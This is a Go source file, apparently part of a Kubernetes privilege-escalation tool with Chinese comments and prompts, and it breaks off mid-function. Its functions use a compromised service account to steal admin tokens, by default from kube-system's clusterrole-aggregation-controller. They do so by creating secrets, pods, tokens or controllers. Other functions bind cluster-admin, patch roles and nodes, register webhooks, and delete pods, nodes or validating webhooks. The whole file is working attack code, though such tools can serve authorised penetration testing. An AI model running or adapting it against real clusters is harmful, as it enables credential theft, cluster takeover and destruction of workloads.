/*
 * @Description:
 * @Author: kingqaquuu
 * @Date: 2025-01-21 16:30:13
 * @LastEditTime: 2025-02-07 18:53:10
 * @LastEditors: kingqaquuu
 */
package exploit

import (
	"context"
	"fmt"
	"k8sEPDS/models"
	exp "k8sEPDS/pkg/exploit/utils"
	"k8sEPDS/pkg/request"
	"k8sEPDS/pkg/scan"
	"math/rand"
	"sort"
	"strconv"
	"strings"
	"time"

	metaV1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func Createsecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 检查是否存在“createsecrets”权限，返回匹配的SA集合
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"createsecrets"})
	if !hasPermission {
		fmt.Println("[X] Createsecrets失败,未检测到createsecrets权限")
		return false, nil
	}
	// 遍历每个通过权限检查的SA
	for _, critSA := range filteredSAs {
		// 默认的目标SA信息
		targetSa := "clusterrole-aggregation-controller"
		targetSaNamespace := "kube-system"
		// hasDirectKubePerm 表示是否直接具备kube-system的权限（无需权限提升）
		hasDirectKubePerm := false
		// 判断是否拥有集群级权限或者权限显式在[kube-system]
		if critSA.Level == "cluster" || critSA.SA.Type[13:] == "[kube-system]" {
			hasDirectKubePerm = true
		} else {
			// 从权限字符串中提取实际目标命名空间
			targetSaNamespace = strings.Trim(critSA.SA.Type[strings.Index(critSA.SA.Type, "["):], "[]")
			fmt.Printf("[!] 当前SA权限仅限于命名空间 [%s]，无法直接在 kube-system 下操作\n", targetSaNamespace)
			fmt.Print("[Y/N] 是否尝试对该命名空间进行权限提升：")
			var userInput string
			fmt.Scan(&userInput)
			if strings.ToUpper(userInput) != "Y" {
				// 用户选择不提升，跳过当前SA
				continue
			}
			fmt.Print("[输入] 请输入要窃取的SA名称:")
			fmt.Scan(&targetSa)
		}
		// 获取当前SA对应的token
		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 读取token失败：", err.Error())
			continue
		}
		// 调用工具函数尝试创建Secret
		err = exp.CreateSecret(token, targetSa, targetSaNamespace)
		if err != nil {
			fmt.Println("[X] 创建Secret失败：", err.Error())
			continue
		}
		// 等待一段时间后尝试通过getsecrets获取Secret
		time.Sleep(5 * time.Second)
		fmt.Println("[msg] 尝试通过getsecrets获取Secret")
		getsecrets(criticalSAs, targetSa, targetSaNamespace, ssh)

		// 如果当前SA具备直接在kube-system操作的权限，则无需继续遍历其它SA
		if hasDirectKubePerm {
			return true, nil
		}
	}
	return true, nil
}

func Createpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 使用 AndCheck 检查是否有 createpods 权限
	hasPermission, permissionSAs := AndCheck(criticalSAs, []string{"createpods"})
	if !hasPermission {
		return false, nil
	}
	// 生成随机的 Pod 名称
	rand.Seed(time.Now().UnixNano())
	podName := fmt.Sprintf("my-pod%d", rand.Intn(10000))

	// 遍历具备 createpods 权限的 SA
	for _, saWrapper := range permissionSAs {
		// 默认目标SA和命名空间设置
		targetSa := "clusterrole-aggregation-controller"
		targetNs := "kube-system"
		hasDirectKubePerm := false
		// 判断当前SA是否直接拥有 kube-system 权限
		// 此处采用判断 SA.Type 后缀是否为 "[kube-system]"，也可以根据实际格式进行调整
		if saWrapper.SA.Crisa.Level == "cluster" || strings.HasSuffix(saWrapper.SA.Type, "[kube-system]") {
			hasDirectKubePerm = true
		} else {
			// 提取实际的命名空间信息
			nsStr := saWrapper.SA.Type
			idx := strings.Index(nsStr, "[")
			if idx != -1 {
				targetNs = strings.Trim(nsStr[idx:], "[]")
			}
			fmt.Printf("[!] 当前SA权限仅限于命名空间 [%s]，无法直接创建Pod于 kube-system。\n", targetNs)
			fmt.Print("[Y/N] 是否尝试对该命名空间进行权限提升？: ")
			var userChoice string
			fmt.Scan(&userChoice)
			if strings.ToUpper(userChoice) != "Y" {
				// 用户拒绝权限提升，跳过当前SA
				continue
			}
			fmt.Print("[输入] 请输入希望窃取的SA名称: ")
			fmt.Scan(&targetSa)
		}
		// 获取当前 SA 的 token
		token, err := scan.GetCriticalSAToken(saWrapper.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 读取 token 失败：", err.Error())
			continue
		}
		// 调用工具函数创建 Pod
		err = exp.CreatePod(token, targetNs, podName, targetSa, ssh.Nodename)
		if err != nil {
			fmt.Println("[X] 创建 Pod 失败：", err.Error())
			continue
		}
		// 等待一段时间后获取已创建 Pod 信息
		time.Sleep(2 * time.Second)
		clientset, _ := request.GetClientSet("")
		targetPod, err := clientset.CoreV1().Pods(targetNs).Get(context.TODO(), podName, metaV1.GetOptions{})
		if err != nil {
			fmt.Println("[X] 获取 Pod 失败，可能缺少相应权限：", err.Error())
			continue
		}
		// 利用创建的 Pod 构造临时 SA 结构体，用于获取 Pod 中挂载的 token
		tmpSa := models.CriticalSA{
			SA0: models.SA{
				SAPod: models.Pod{
					Uid: string(targetPod.UID),
				},
			},
		}
		resultToken, err := scan.GetCriticalSAToken(tmpSa, ssh)
		if err != nil {
			fmt.Println("[X] 未能读取到 Pod 挂载的 SA Token：", err.Error())
		} else {
			fmt.Println("[结果]", resultToken)
		}

		// 如果当前SA具备直接操作 kube-system 的权限，则无需继续遍历其它SA
		if hasDirectKubePerm {
			return true, nil
		}
	}
	return true, nil
}

func Createtokens(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 检查是否存在 createtokens 权限，并获取符合条件的 SA 集合
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"createtokens"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 createtokens 权限")
		return false, nil
	}

	// 遍历每个符合条件的 SA
	for _, cs := range filteredSAs {
		// 默认目标SA和命名空间
		targetSa := "clusterrole-aggregation-controller"
		targetNamespace := "kube-system"
		// directAccess 表示是否直接具备在 kube-system 操作的权限
		directAccess := false

		// 检查当前 SA 是否直接拥有 kube-system 权限
		if cs.Level == "cluster" || cs.SA.Type[12:] == "[kube-system]" {
			directAccess = true
		} else {
			// 从权限字符串中提取实际权限所在命名空间
			targetNamespace = strings.Trim(cs.SA.Type[strings.Index(cs.SA.Type, "["):], "[]")
			fmt.Printf("[!] 当前SA权限仅限于命名空间 [%s]，无法直接在 kube-system 下创建Token\n", targetNamespace)
			fmt.Print("[Y/N] 是否尝试进行权限提升（使用其他命名空间下的SA）：")
			var escalation string
			fmt.Scan(&escalation)
			if strings.ToUpper(escalation) != "Y" {
				// 用户选择不提升，跳过当前 SA
				continue
			}
			fmt.Print("[输入] 请输入希望窃取的SA名称：")
			fmt.Scan(&targetSa)
		}

		// 获取当前SA对应的token
		token, err := scan.GetCriticalSAToken(cs.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}

		// 调用 CreateToken 函数尝试创建Token
		secret, err := exp.CreateToken(token, targetNamespace, targetSa)
		if err != nil {
			fmt.Println("[X] 调用 CreateToken 时出错：", err.Error())
		} else {
			fmt.Println("[结果] 管理员 Token:\n" + secret)
		}

		// 如果当前SA具备直接操作 kube-system 的权限，则无需继续遍历其它SA
		if directAccess {
			return true, nil
		}
	}
	return true, nil
}

func Createclusterrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"createclusterrolebindings"})
	if !hasPermission || len(filteredSAs) == 0 {
		fmt.Println("[X] createclusterrolebindings 权限未检测到")
		return false, nil
	}
	var saNamespace, saName string
	fmt.Println("[√] 检测到 createclusterrolebindings 权限，可绑定 cluster-admin")
	fmt.Print("[输入] 请输入目标账号信息（格式：namespace saName）：")
	fmt.Scan(&saNamespace, &saName)

	token, err := scan.GetCriticalSAToken(filteredSAs[0].SA.Crisa, ssh)
	if err != nil {
		fmt.Println("[X] 获取 token 失败：", err.Error())
		return false, err
	}

	if err = exp.CreateClusterRoleBinding(token, saName, saNamespace, "Test"); err != nil {
		fmt.Println("[X] CreateClusterRoleBinding 执行失败：", err.Error())
		return false, err
	}
	return true, nil
}

func Createrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"createrolebindings"})
	if !hasPermission || len(filteredSAs) == 0 {
		fmt.Println("[X] createrolebindings 权限未检测到")
		return false, nil
	}
	var saNamespace, roleName, saName string
	fmt.Println("[√] 检测到 createrolebindings 权限，准备进行权限升级")
	fmt.Print("[输入] 请输入目标 SA 所在命名空间和 SA 名称（格式：namespace saName）：")
	fmt.Scan(&saNamespace, &saName)
	fmt.Print("[输入] 请输入期望绑定的角色名称：")
	fmt.Scan(&roleName)
	for _, cs := range filteredSAs {
		// 判断是否具有集群级权限或在指定命名空间内的权限
		if cs.SA.Crisa.Level == "cluster" || strings.HasSuffix(cs.SA.Type, "["+saNamespace+"]") {
			token, err := scan.GetCriticalSAToken(cs.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 获取 token 失败：", err.Error())
				continue
			}
			if err = exp.CreateRoleBinding(token, saName, saNamespace, "testrolebinding", roleName); err != nil {
				fmt.Println("[X] CreateRoleBinding 执行失败：", err.Error())
				return false, err
			}
			return true, nil
		}
	}
	fmt.Println("[X] 指定命名空间下未检测到 createrolebindings 权限")
	return false, nil
}

func Createpodeviction(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"createpodevictions"})
	if !hasPermission || len(filteredSAs) == 0 {
		return false, nil
	}
	for _, cs := range filteredSAs {
		var delChoice string
		fmt.Printf("[√] 检测到 createpodevictions 权限，当前权限范围：%s\n", cs.SA.Type)
		fmt.Print("[Y/N] 是否删除该命名空间下的 Pod？：")
		fmt.Scan(&delChoice)
		if strings.ToUpper(delChoice) != "Y" {
			continue
		}
		var namespace, podName string
		fmt.Print("[输入] 请输入目标 Pod 的命名空间和名称（格式：namespace podName）：")
		fmt.Scan(&namespace, &podName)
		token, err := scan.GetCriticalSAToken(cs.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		if err = exp.CreatePodEviction(token, namespace, podName); err != nil {
			fmt.Println("[X] Pod 删除失败：", err.Error())
		} else {
			fmt.Println("[√] Pod 成功驱逐")
		}
	}
	return true, nil
}

func Createpodcontrollers(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	//Automation part
	hasPermission, filteredSAs := OrCheck(criticalSAs, []string{"createdeployments", "createdaemonsets", "createstatefulsets", "createreplicasets", "createjobs", "createcronjobs"})
	if !hasPermission {
		return false, nil
	}
	// 生成 PodController 名称
	rand.Seed(time.Now().UnixNano())
	randomNumber := rand.Intn(10000)
	podControllerName := "my-pod" + strconv.Itoa(randomNumber)

	// 遍历所有符合条件的 SA
	for _, saInfo := range filteredSAs {
		var escalateChoice string
		directAccess := false
		targetSA := "clusterrole-aggregation-controller"
		targetNamespace := "kube-system"
		// 判断是否具备直接在 kube-system 下操作的权限
		if saInfo.Level == "cluster" || strings.HasSuffix(saInfo.SA.Type, "[kube-system]") {
			directAccess = true
		} else {
			// 提取 SA 权限所在命名空间
			idx := strings.Index(saInfo.SA.Type, "[")
			if idx != -1 {
				targetNamespace = strings.Trim(saInfo.SA.Type[idx:], "[]")
			}
			fmt.Printf("[!] 当前SA权限仅限于 [%s]，无法直接在 kube-system 下创建 PodController。\n", targetNamespace)
			fmt.Print("[Y/N] 是否尝试权限提升？: ")
			fmt.Scan(&escalateChoice)
			if strings.ToUpper(escalateChoice) != "Y" {
				continue
			}
			fmt.Print("[输入] 请输入希望窃取的SA名称：")
			fmt.Scan(&targetSA)
		}
		// 提取 controller 类型，假设 SA.Type 格式为 "create<controllerType>[...]"，
		// 若无 "[" 则直接截取第6个字符后部分
		var controllerType string
		idx := strings.Index(saInfo.SA.Type, "[")
		if idx == -1 {
			controllerType = saInfo.SA.Type[6:]
		} else {
			controllerType = saInfo.SA.Type[6:idx]
		}
		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		// 调用工具函数创建 PodController
		if err = exp.CreatePodController(token, controllerType, targetNamespace, targetSA, podControllerName, ssh.Nodename); err != nil {
			fmt.Println("[X] 创建 PodController 失败：", err.Error())
			continue
		}

		// 根据 controller 类型等待相应时间，cronjobs 等待较长时间
		if controllerType == "cronjobs" {
			fmt.Println("[!] Cronjobs 控制器创建成功，等待 65 秒以获取 token...")
			time.Sleep(65 * time.Second)
		} else {
			time.Sleep(2 * time.Second)
		}
		// 通过 label selector 获取创建的 Pod 信息
		clientset, _ := request.GetClientSet("")
		labelSelector := fmt.Sprintf("%s=%s", podControllerName, podControllerName)
		podList, err := clientset.CoreV1().Pods(targetNamespace).List(context.TODO(), metaV1.ListOptions{
			LabelSelector: labelSelector,
		})
		if err != nil || len(podList.Items) == 0 {
			fmt.Println("[X] 无法获取 Pod 信息，可能缺少相应权限：", err.Error())
			continue
		}
		targetPod := podList.Items[0]
		// 构造临时 SA 用于获取 Pod 中挂载的 token
		tmpSA := models.CriticalSA{
			SA0: models.SA{
				SAPod: models.Pod{
					Uid: string(targetPod.UID),
				},
			},
		}
		resultToken, err := scan.GetCriticalSAToken(tmpSA, ssh)
		if err != nil {
			fmt.Println("[X] 未能获取 Pod 中挂载的 SA Token：", err.Error())
		} else {
			fmt.Println("[结果]", resultToken)
		}
		// 若当前 SA 直接具备权限，则无需继续遍历其它 SA
		if directAccess {
			return true, nil
		}
	}
	return true, nil
}

func Createwebhookconfig(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := OrCheck(criticalSAs, []string{"createmutatingwebhookconfigurations", "createvalidatingwebhookconfigurations"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 webhookconfig 创建权限")
		return false, nil
	}
	for _, saInfo := range filteredSAs {
		// 从 SA.Type 中提取 webhook 配置类型（去除前缀 "create"）
		webhookConfigType := saInfo.SA.Type[6:]
		var userChoice string
		fmt.Printf("[Y/N] 检测到 [%s] 权限，是否创建 webhookconfig？ ", saInfo.SA.Type)
		fmt.Scan(&userChoice)
		if strings.ToUpper(userChoice) != "Y" {
			continue
		}
		// 交互式获取 webhook 配置参数
		var webhookURL, ca string
		fmt.Print("[输入] 请输入 webhook URL：")
		fmt.Scan(&webhookURL)
		fmt.Print("[输入] 请输入 CA Bundle：")
		fmt.Scan(&ca)
		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		if err = exp.CreateWebhookConfig(token, webhookConfigType, webhookURL, ca); err != nil {
			fmt.Println("[X] 创建 webhookconfig 失败：", err.Error())
			continue
		}
		fmt.Println("[√] webhookconfig 创建成功")
	}
	return true, nil
}

func Deletepods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"deletepods"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 Deletepods 权限")
		return false, nil
	}
	for _, critSA := range filteredSAs {
		var choice string
		var namespace, podName string

		fmt.Printf("[√] 检测到删除 Pod 权限，权限范围：%s\n", critSA.SA.Type)
		fmt.Print("[Y/N] 是否删除该命名空间下的 Pod？：")
		fmt.Scan(&choice)
		if strings.ToUpper(choice) != "Y" {
			continue
		}
		fmt.Println("[输入] 请输入目标 Pod 的命名空间和名称（格式：namespace podName）：")
		fmt.Scan(&namespace, &podName)

		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		if err = exp.DeletePods(token, namespace, podName); err != nil {
			fmt.Println("[X] 删除 Pod 失败：", err.Error())
			continue
		}
		fmt.Println("[√] Pod 删除成功")
	}
	return true, nil
}

func Deletenodes(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"deletenodes"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 Deletenodes 权限")
		return false, nil
	}
	for _, critSA := range filteredSAs {
		var choice string
		var node string

		fmt.Println("[√] 检测到删除节点权限")
		fmt.Print("[Y/N] 是否删除该节点？：")
		fmt.Scan(&choice)
		if strings.ToUpper(choice) != "Y" {
			continue
		}
		fmt.Print("[输入] 请输入要删除的节点名称：")
		fmt.Scan(&node)

		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		if err = exp.DeleteNodes(token, node); err != nil {
			fmt.Println("[X] 删除节点失败：", err.Error())
			continue
		}
		fmt.Println("[√] 节点删除成功")
	}
	return true, nil
}

func Deletevalidatingwebhookconfigurations(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"deletevalidatingwebhookconfigurations"})
	if !hasPermission {
		fmt.Println("[X] 未检测到删除 ValidatingWebhookConfiguration 权限")
		return false, nil
	}
	for _, critSA := range filteredSAs {
		var choice string
		var webhookConfigName string

		fmt.Printf("[√] 检测到删除 ValidatingWebhookConfiguration 权限，权限范围：%s\n", critSA.SA.Type)
		fmt.Print("[Y/N] 是否删除 ValidatingWebhookConfiguration？：")
		fmt.Scan(&choice)
		if strings.ToUpper(choice) != "Y" {
			continue
		}
		fmt.Print("[输入] 请输入要删除的 ValidatingWebhookConfiguration 名称：")
		fmt.Scan(&webhookConfigName)

		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		if err = exp.DeleteValidatingWebhookConfigurations(token, webhookConfigName); err != nil {
			fmt.Println("[X] 删除 ValidatingWebhookConfiguration 失败：", err.Error())
			continue
		}
		fmt.Println("[√] ValidatingWebhookConfiguration 删除成功")
	}
	return true, nil
}

func Getsecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"getsecrets"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 Getsecrets 权限")
		return false, nil
	}
	for _, critSA := range filteredSAs {
		// 默认配置
		escalationChoice := "N"
		targetSA := "clusterrole-aggregation-controller"
		targetNamespace := "kube-system"
		directAccess := false
		// 判断是否具备直接在 kube-system 下操作权限（集群级或者权限后缀为 [kube-system]）
		if critSA.Level == "cluster" || strings.HasSuffix(critSA.SA.Type, "[kube-system]") {
			directAccess = true
		} else {
			// 尝试从 SA.Type 中提取命名空间信息
			idx := strings.Index(critSA.SA.Type, "[")
			if idx != -1 {
				targetNamespace = strings.Trim(critSA.SA.Type[idx:], "[]")
			}
			fmt.Println("[!] 当前SA没有在 kube-system 下的 getsecrets 权限，其权限范围为:", targetNamespace)
			fmt.Print("[Y/N] 是否尝试权限提升？ ")
			fmt.Scan(&escalationChoice)
			if strings.ToUpper(escalationChoice) != "Y" {
				continue
			}
			fmt.Print("[input] 请输入希望窃取的SA名称: ")
			fmt.Scan(&targetSA)
		}
		// 检查是否存在资源名称限制 (例如 SA.Type 包含 "(xxx)" 表示限制只能窃取 xxx )
		if strings.Contains(critSA.SA.Type, "(") && strings.Contains(critSA.SA.Type, ")") {
			start := strings.Index(critSA.SA.Type, "(") + 1
			end := strings.Index(critSA.SA.Type, ")")
			if end > start {
				resourceName := critSA.SA.Type[start:end]
				if targetSA != resourceName {
					fmt.Println("[X] 资源名称受限，只能窃取:", resourceName)
					// 跳过当前循环
					continue
				}
			}
		}
		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败:", err.Error())
			continue
		}
		secret, err := exp.GetSecrets(token, targetSA, targetNamespace)
		if err != nil {
			fmt.Println("[X] 执行 GetSecrets 出错:", err.Error())
		} else {
			fmt.Println("[result] Admin token: \n" + secret)
		}
		if directAccess {
			return true, nil
		}
	}

	return true, nil
}

func Listsecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"listsecrets"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 Listsecrets 权限")
		return false, nil
	}
	for _, critSA := range filteredSAs {
		targetNamespace := "kube-system"
		directAccess := false

		// 判断是否具备直接在 kube-system 下操作的权限
		if critSA.Level == "cluster" || strings.HasSuffix(critSA.SA.Type, "[kube-system]") {
			directAccess = true
		} else {
			// 尝试从 SA.Type 中提取实际权限所在命名空间
			idx := strings.Index(critSA.SA.Type, "[")
			if idx != -1 {
				targetNamespace = strings.Trim(critSA.SA.Type[idx:], "[]")
			}
			fmt.Printf("[!] 当前SA权限仅限于命名空间 [%s]\n", targetNamespace)
			fmt.Print("[Y/N] 是否尝试权限提升？ ")
			var escalateChoice string
			fmt.Scan(&escalateChoice)
			if strings.ToUpper(escalateChoice) != "Y" {
				continue
			}
			// 此处权限提升无需指定目标SA，仅用于告知操作范围
			fmt.Println("[input] 尝试对该命名空间下进行Secret列表操作")
		}
		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败:", err.Error())
			continue
		}

		secretList, err := exp.ListSecrets(token, targetNamespace)
		if err != nil {
			fmt.Println("[X] 执行 ListSecrets 失败:", err.Error())
			continue
		}

		if len(secretList.Items) == 0 {
			fmt.Printf("[msg] 命名空间 [%s] 下无 Secret\n", targetNamespace)
		} else {
			fmt.Printf("[result] 命名空间 [%s] 下共检测到 %d 个 Secret:\n", targetNamespace, len(secretList.Items))
			for _, secret := range secretList.Items {
				fmt.Println(" -", secret.Name)
			}
		}

		// 若当前SA具备直接权限，则直接返回
		if directAccess {
			return true, nil
		}
	}
	return true, nil
}

func Patchclusterroles(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"patchclusterroles"})
	if !hasPermission || len(filteredSAs) == 0 {
		fmt.Println("[X] 未检测到 patchclusterroles 权限，操作终止。")
		return false, nil
	}
	var clusterroleName string
	fmt.Println("[√] 检测到 patchclusterroles 权限，准备进行权限升级。")
	fmt.Print("[输入] 请输入受控 SA 所绑定的 ClusterRole 名称：")
	fmt.Scan(&clusterroleName)
	token, err := scan.GetCriticalSAToken(filteredSAs[0].SA.Crisa, ssh)
	if err != nil {
		fmt.Println("[X] 获取 token 失败：", err.Error())
		return false, err
	}
	err = exp.PatchClusterRole(token, clusterroleName)
	if err != nil {
		fmt.Println("[X] 更新 ClusterRole 出错：", err.Error())
		return false, err
	}

	fmt.Println("[√] ClusterRole 更新成功。")
	return true, nil
}

func Patchroles(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, filteredSAs := AndCheck(criticalSAs, []string{"patchroles"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 patchroles 权限")
		return false, nil
	}
	var roleNamespace, roleName string
	fmt.Println("[√] 检测到 patchroles 权限，准备进行权限升级。")
	fmt.Print("[输入] 请输入受控 SA 所绑定的 Role 的命名空间和名称（格式：namespace name）：")
	fmt.Scan(&roleNamespace, &roleName)
	for _, cs := range filteredSAs {
		saNS := extractNamespace(cs.SA.Type)
		// 如果SA具备集群级权限，或其权限限制与输入的命名空间一致，则可进行更新
		if cs.SA.Crisa.Level == "cluster" || (saNS != "" && saNS == roleNamespace) {
			token, err := scan.GetCriticalSAToken(cs.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 获取 token 失败：", err.Error())
				continue
			}
			err = exp.PatchRole(token, roleNamespace, roleName)
			if err != nil {
				fmt.Println("[X] PatchRole 执行出错：", err.Error())
				return false, err
			}
			return true, nil
		}
	}
	fmt.Println("[X] 指定命名空间下未检测到 patchroles 权限")
	return false, nil
}

func Patchclusterrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, validSAs := AndCheck(criticalSAs, []string{"patchclusterrolebindings"})
	if !hasPerm || len(validSAs) == 0 {
		fmt.Println("[X] 未检测到 patchclusterrolebindings 权限")
		return false, nil
	}
	var clusterrolebindingName string
	var saNamespace string
	var saName string
	fmt.Println("[√] 检测到 patchclusterrolebindings 权限，准备进行权限升级。")
	fmt.Print("[输入] 请输入需要更新的 ClusterRoleBinding 名称：")
	fmt.Scan(&clusterrolebindingName)
	fmt.Print("[输入] 请输入目标账号信息（格式：namespace saName）：")
	fmt.Scan(&saNamespace, &saName)
	token, err := scan.GetCriticalSAToken(validSAs[0].SA.Crisa, ssh)
	if err != nil {
		fmt.Println("[X] 获取 token 失败：", err.Error())
		return false, err
	}
	err = exp.PatchClusterRoleBinding(token, clusterrolebindingName, saNamespace, saName)
	if err != nil {
		fmt.Println("[X] PatchClusterRoleBinding 执行失败：", err.Error())
		return false, err
	}
	fmt.Println("[√] ClusterRoleBinding 更新成功。")
	return true, nil
}

func Patchrolebindings(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, filteredSAs := AndCheck(criticalSAs, []string{"patchrolebindings"})
	if !hasPerm || len(filteredSAs) == 0 {
		fmt.Println("[X] Patchrolebindings 权限未检测到")
		return false, nil
	}
	fmt.Println("[√] 检测到 patchrolebindings 权限，准备进行权限升级")
	saNamespace := readInput("[input] 请输入目标 SA 的命名空间: ")
	saName := readInput("[input] 请输入目标 SA 的名称: ")
	rolebindingName := readInput("[input] 请输入需要更新的 RoleBinding 名称: ")
	for _, f := range filteredSAs {
		// 使用辅助函数提取 SA 权限所在的命名空间
		saPermNS := extractNamespace(f.SA.Type)
		// 若具备集群级权限或者命名空间匹配，则执行更新操作
		if f.SA.Crisa.Level == "cluster" || (saPermNS != "" && saPermNS == saNamespace) {
			token, err := scan.GetCriticalSAToken(f.SA.Crisa, ssh)
			if err != nil {
				fmt.Println("[X] 获取 token 失败:", err.Error())
				continue
			}
			err = exp.PatchRoleBinding(token, rolebindingName, saNamespace, saName)
			if err != nil {
				fmt.Println("[X] PatchRoleBinding 执行失败:", err.Error())
				return false, err
			}
			fmt.Println("[√] RoleBinding 更新成功")
			return true, nil
		}
	}
	fmt.Println("[X] 指定命名空间下未检测到合适的 patchrolebindings 权限")
	return false, nil
}

func Patchnodes(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, filteredSAs := AndCheck(criticalSAs, []string{"patchnodes"})
	if !hasPerm || len(filteredSAs) == 0 {
		fmt.Println("[X] Patchnodes 权限未检测到")
		return false, nil
	}
	confirm := readInput("[√] 检测到 PatchNodes 权限，是否进行 Patch 操作 (Y/N): ")
	if strings.ToUpper(confirm) != "Y" {
		fmt.Println("[X] 用户取消了操作")
		return false, nil
	}
	token, err := scan.GetCriticalSAToken(filteredSAs[0].SA.Crisa, ssh)
	if err != nil {
		fmt.Println("[X] 获取 token 失败：", err.Error())
		return false, err
	}
	if err = exp.PatchNodes(token, ssh.Nodename); err != nil {
		fmt.Println("[X] PatchNodes 操作失败：", err.Error())
		return false, err
	}
	fmt.Println("[√] 所有普通节点 Patch 成功")
	fmt.Println("[msg] 正在等待 Pod 重新调度……")
	time.Sleep(5 * time.Second)
	return true, nil
}

func Patchnodestatus(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 检查是否具有 patchnodestatus 权限
	hasPerm, permissionSAs := AndCheck(criticalSAs, []string{"patchnodestatus"})
	if !hasPerm || len(permissionSAs) == 0 {
		fmt.Println("[X] 未检测到 patchnodestatus 权限")
		return false, nil
	}
	fmt.Println("[√] 检测到 patchnodestatus 权限，准备对节点状态进行 patch 操作")
	// 提示用户输入目标节点名称列表（使用逗号分隔）
	fmt.Print("[input] 请输入需要 patch 状态的节点名称列表，使用逗号分隔：")
	var nodeListInput string
	fmt.Scan(&nodeListInput)
	// 解析节点名称列表
	nodes := strings.Split(nodeListInput, ",")
	for i, node := range nodes {
		nodes[i] = strings.TrimSpace(node)
	}
	// 遍历具备 patchnodestatus 权限的 SA，尝试获取 token 并进行 patch 操作
	for _, saInfo := range permissionSAs {
		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		// 调用工具函数执行 NodeStatus patch 操作（第二个参数为节点名称列表）
		err = exp.PatchNodeStatus(token, nodes)
		if err != nil {
			fmt.Println("[X] Patch NodeStatus 操作失败：", err.Error())
			continue
		}
		fmt.Printf("[√] 成功 patch 节点 [%v] 状态\n", nodes)
		return true, nil
	}
	return false, fmt.Errorf("所有 SA 的 Patch NodeStatus 操作均失败")
}

func Patchpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 检查是否具有 patchpods 权限
	hasPerm, permissionSAs := AndCheck(criticalSAs, []string{"patchpods"})
	if !hasPerm || len(permissionSAs) == 0 {
		fmt.Println("[X] 未检测到 patchpods 权限")
		return false, nil
	}
	// 默认目标命名空间为 kube-system
	targetNamespace := "kube-system"
	fmt.Printf("[input] 请输入目标 Pod 的命名空间（默认 %s）：", targetNamespace)
	var nsInput string
	fmt.Scan(&nsInput)
	if strings.TrimSpace(nsInput) != "" {
		targetNamespace = nsInput
	}
	// 提示用户输入目标 Pod 名称
	var podName string
	fmt.Print("[input] 请输入目标 Pod 的名称：")
	fmt.Scan(&podName)
	fmt.Println("[√] 检测到 patchpods 权限，准备对 Pod 进行 patch 操作")
	// 遍历具备 patchpods 权限的 SA，尝试获取 token 并执行 Pod patch 操作
	for _, saInfo := range permissionSAs {
